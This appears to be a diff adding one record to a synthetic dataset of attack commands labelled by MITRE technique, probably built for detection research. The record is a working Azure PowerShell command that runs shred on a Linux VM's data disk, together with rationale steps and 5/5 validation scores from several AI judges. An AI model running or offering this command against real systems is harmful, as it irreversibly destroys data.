@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Archive' -Name 'LinVM-Archive' -CommandId 'RunShellScript' -ScriptString \"shred -v -n 3 -z /dev/sdc\"",
+  "explanation": "Overwrites the entire data disk /dev/sdc on a Linux VM with multiple passes, destroying all data on that targeted disk.",
+  "rationale_steps": [
+    "Identify the specific attached data disk (/dev/sdc) used for archives.",
+    "Overwrite the block device with multiple passes and a final zero pass to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-19276e27",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Azure PowerShell cmdlet with correct parameters and balanced quoting, and the embedded shred command uses proper flags.",
+        "semantic_score": 5,
+        "semantic_justification": "RunShellScript runs as root on the Linux VM and executes 'shred -v -n 3 -z /dev/sdc', which overwrites the target disk and achieves data destruction consistent with T1485.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:09:36.130462Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced quotes, valid Invoke-AzVMRunCommand parameters, correct flag usage for shred (-v, -n 3, -z), and proper ScriptString embedding.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1485 by using shred with multiple overwrite passes (-n 3) and a final zero-pass (-z) on an entire block device (/dev/sdc) via Azure VM Run Command, which is a realistic and operationally plausible method for irreversible data destruction on a cloud IaaS disk.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T01:40:11.986727Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command and the encapsulated shell script use correct syntax, balanced quotes, and valid Azure cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately utilizes the Azure RunCommand extension to execute a destructive shred operation on a block device, perfectly aligning with T1485.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:40:13.318276Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
